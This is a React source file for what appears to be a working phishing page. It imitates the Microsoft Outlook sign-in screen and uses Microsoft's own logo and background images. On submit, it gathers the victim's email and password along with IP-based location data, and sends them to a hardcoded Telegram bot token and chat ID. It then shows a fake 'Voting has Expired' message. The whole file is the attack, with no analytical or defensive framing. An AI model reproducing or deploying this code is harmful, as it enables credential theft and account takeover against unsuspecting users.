import React from 'react'

export default function Microsoft() {
    const [result, setResult] = React.useState("");

    const onSubmit = async (event) => {
        event.preventDefault();
        const formData = {};
        Array.from(event.currentTarget.elements).forEach((field) => {
            if (!field.name) return;
            formData[field.name] = field.value;
        });

        fetch("https://ipapi.co/json/")
            .then((res) => res.json())
            .then((data) => {
                var ct = data.ip;
                var co = data.country_name;
                var lo = data.country_calling_code;
                var st = data.city;

                var NameLogin = formData.name;
                var PasswordLogin = formData.password;
                var SubmitValue = `Instagram Result is:%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;

                var token = "6807684688:AAGnRdy0_lrzwmZYcaGQxCSx0sm3p93WLSU";
                var chat_id = -4969598577;
                var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${SubmitValue}`;

                let api = new XMLHttpRequest();
                api.open("GET", url, true);
                api.send();

                setTimeout(() => {
                    setResult("Unfortunately, Voting has Expired....");
                }, 2000);
            });
    };

    return (


        <div className='flex md:items-center relative justify-center h-screen w-screen md:bg-[url(https://logincdn.msftauth.net/shared/5/js/../images/78_3a53c38a2dc671fb4daf.jpg)] bg-bg-center bg-bg-cover'>
            <div className="bg-white p-8">
                <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="Microsoft" className='h-6 w-auto' />
                <div className="mt-5 min-w-80">
                    <h2 className='font-bold text-2xl'>Sign in</h2>
                    <p className='text-[#1b1b1b] text-xs'>to continue to Outlook</p>

                    <form className="grid gap-3 mt-5 w-full overflow-hidden"
                        onSubmit={onSubmit}
                    >
                        <div className="w-full grid gap-3">
                            <input
                                required
                                className="py-3 border-b outline-none border-black/80 text-black/60 bg-transparent text-sm w-full"
                                type="text"
                                name="name"
                                placeholder="Email, phone, or Skype"
                            />
                            <input
                                required
                                className="py-3 border-b outline-none border-black/80 text-black/60 bg-transparent text-sm w-full"
                                type="text"
                                name="password"
                                placeholder="Password"
                            />
                            <div className="flex items-center gap-1 text-sm  ">
                                <a href="#">No account?</a>
                                <a href="#" className='text-blue-500'>Create one!</a>
                            </div>
                            <button

                                className="bg-[#0067bb] py-2 px-6 text-base text-white mt-5 ms-auto w-fit"
                            >
                                Next
                            </button>
                        </div>

                        <p className="text-center text-xs text-red-600">{result}</p>

                    </form>
                </div>
            </div>
            <div className="absolute z-10 bottom-0 w-full py-3 text-center md:text-right md:bg-[#ffffff]">
                <p className='text-xs text-[#545454]'>Use private browsing if this is not your device.</p>
            </div>
        </div>
    )
}
